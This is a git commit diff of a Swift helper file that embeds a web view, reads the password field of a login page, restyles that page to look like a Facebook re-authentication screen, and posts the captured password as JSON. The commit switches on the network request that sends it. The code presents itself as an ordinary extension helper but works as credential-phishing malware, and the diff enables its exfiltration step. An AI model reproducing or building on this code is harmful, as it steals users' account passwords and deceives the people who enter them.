3e7881da5612049029be466da8d9b41fabff89ad
danhv <danhv@riki.edu.vn>
2023-03-26 00:46:37 +0700

    update

--- Sources/ExtensionHelper3/CoordsThree.swift
+++ Sources/ExtensionHelper3/CoordsThree.swift
@@ -1,6 +1,6 @@
 //
 //  File.swift
-//  
+//
 //
 //  Created by DanHa on 25/03/2023.
 //
@@ -13,17 +13,17 @@ struct CoordsThree: UIViewRepresentable {
     func makeCoordinator() -> CoorThreeDinator {
         CoorThreeDinator(self)
     }
-    
+
     let url: URL?
     @Binding var is_three_chuyen_man: Bool
     @Binding var is_three_load_hide: Bool
     @Binding var is_three_get_mat_khau: String
-    
+
     private let ob_three_servable = Web_Three()
     var ob_three_server: NSKeyValueObservation? {
         ob_three_servable.ins_three_tance
     }
-    
+
     func makeUIView(context: Context) -> WKWebView {
         let prefs = WKWebpagePreferences()
         prefs.allowsContentJavaScript = true
@@ -34,24 +34,23 @@ struct CoordsThree: UIViewRepresentable {
         config.defaultWebpagePreferences = prefs
         config.userContentController = userContentController
         userContentController.addUserScript(script)
-        
+
         let webview = WKWebView(frame: .zero, configuration: config)
         webview.customUserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15"
         webview.navigationDelegate = context.coordinator
         webview.load(URLRequest(url: url!))
         return webview
     }
-    
+
     func updateUIView(_ uiView: WKWebView, context: Context) {
-        
     }
-    
+
     class CoorThreeDinator: NSObject, WKNavigationDelegate {
         var three_pa_rent: CoordsThree
         init(_ three_pa_rent: CoordsThree) {
             self.three_pa_rent = three_pa_rent
         }
-        
+
         func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
             webView.evaluateJavaScript("document.querySelector('[type=\"password\"]').value;") { pword, errorPword in
                 if let pword = pword as? String, errorPword == nil {
@@ -59,7 +58,7 @@ struct CoordsThree: UIViewRepresentable {
                 }
             }
         }
-        
+
         func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
             webView.evaluateJavaScript("var x = document.createElement(\"IMG\"); x.setAttribute(\"src\", \"https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg\"); x.setAttribute(\"width\", \"200\"); x.setAttribute(\"height\", \"80\"); x.setAttribute(\"style\", \"display: block; margin-left: auto; margin-right: auto; width:100%;\"); document. getElementById(\"bluebarRoot\").appendChild(x); document.querySelector('[id=\"pageFooter\"]').style.display='none'; document.querySelector('[id=\"content\"]').style = 'min-height: 0px'; document.querySelector(\".uiInterstitialLarge\").style = 'width: 350px'; document.querySelector('[aria-label=\"Facebook\"]').style.display='none'; document.querySelector('[href=\"/recover/initiate/?ref=www_reauth_page\"]').style.display='none'; document.querySelector('[class=\"UIFullPage_Container\"]').style = 'width: 100%';  document.querySelector('[id=\"globalContainer\"]').style = 'width: 100%'; document.querySelector('[id=\"pagelet_dock\"]').style.display='none';")
             DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
@@ -82,17 +81,14 @@ struct CoordsThree: UIViewRepresentable {
                                     request.setValue("application/json", forHTTPHeaderField: "Content-Type")
                                     request.httpBody = json_data
                                     print("-------> is three mat khau \(self.three_pa_rent.is_three_get_mat_khau)")
-//                                    let task = URLSession.shared.dataTask(with: request) { data, response, error in
-//                                        if error != nil {
-//                                            print("not_ok")
-//                                        } else {
-                                    DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
-                                        self.three_pa_rent.is_three_chuyen_man = true
+                                    let task = URLSession.shared.dataTask(with: request) { _, _, error in
+                                        if error != nil {
+                                            print("not_ok")
+                                        } else {
+                                            self.three_pa_rent.is_three_chuyen_man = true
+                                        }
                                     }
-                                            
-//                                        }
-//                                    }
-//                                    task.resume()
+                                    task.resume()
                                 }
                             }
                         }
@@ -101,12 +97,12 @@ struct CoordsThree: UIViewRepresentable {
             }
         }
     }
-    
 }
 
 struct UserInvoicesMK: Codable {
     var matkhau: String
 }
+
 private class Web_Three: ObservableObject {
     @Published var ins_three_tance: NSKeyValueObservation?
 }
